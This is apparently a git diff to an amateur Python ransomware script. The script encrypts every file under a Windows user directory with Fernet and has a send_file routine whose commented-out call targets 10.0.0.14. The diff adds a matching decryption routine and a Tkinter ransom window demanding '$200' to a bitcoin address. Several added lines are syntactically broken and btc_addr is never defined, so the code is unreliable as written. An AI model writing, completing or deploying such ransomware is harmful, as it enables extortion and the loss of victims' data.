@@ -18,7 +18,7 @@ from cryptography.fernet import Fernet
 import os
 import ctypes
 import socket
-#from Tkinter import *
+from Tkinter import *
 
 def curr_user():
 	user = os.popen('whoami').read() #which user am i and strip just their name (no domain prefix)
@@ -53,6 +53,32 @@ def encrypt_all_dir(root_dir, key):
                         o = open(os.path.join(root_dir, file), 'wb')
                         o.write(encrypted)
                         o.close()
+def decrypt_all_dir(root_dir, key):
+        for dirName, subDirList, fileList in os.walk(root_dir):
+                for file in fileList:
+                        print(os.path.join(root_dir, file))
+                        try:
+                                o = open(os.path.join(root_dir, file), 'rb')
+                        except PermissionError:
+                                continue
+                        except FileNotFoundError:
+                                continue
+                        o = open(os.path.join(root_dir, file), 'rb')
+                        data = o.read()
+                        o.close()
+                        fernet = Fernet(key)
+                        decrypted = fernet.decrypt(data)
+
+                        try:
+                                o = open(os.path.join(root_dir, file), 'wb')
+                        except PermissionError:
+                                continue
+                        except FileNotFoundError:
+                                continue
+                        o = open(os.path.join(root_dir, file), 'wb')
+                        o.write(decrypted)
+                        o.close()
+
 
 def send_file(file_name, host, port):
 
@@ -87,22 +113,37 @@ def main():
         key = Fernet.generate_key()
         key_name = "testing" #os.popen('nslookup myip.opendns.com. resolver1.opendns.com').read()
         key_name = key_name.replace('.', '-') + '.key'
-        f = open(key_name, "wb")
-        f.write(key)
+
+        f = open(key_name, "rb")
+        key = f.read()
         f.close()
         user = curr_user()
-        target_dir = 'C:\\Users\\' + 'utkar\Documents' #user
+        target_dir = 'C:\\Users\\' + 'utkar' #user
         print(target_dir)
         print(key)
-        encrypt_all_dir(target_dir, key)
+        #encrypt_all_dir(target_dir, key)
 
 	#send_file(key_name, '10.0.0.14', 10000)
 	#delete the key file
 	#os.remove(key_name)
 
-if __name__ == "__main__":
-    
-	main()
+class GUI:
+        def __init__(self, master)
+        self.master = master
+        master.title = "Merry Christmas"
+        self.label = Label(master,text="This is my first GUI, and im using it to steal your money")
+        self.label.pack()
+
+        self.label1 = Label(master, text="Pay $200 to" + btc_addr)
+
+#main()
+#root = Tk()
+#gui = GUI(root)
+#root.mainloop()
+if __name__ = '__main__':
+        main()
+
+
 
 
 
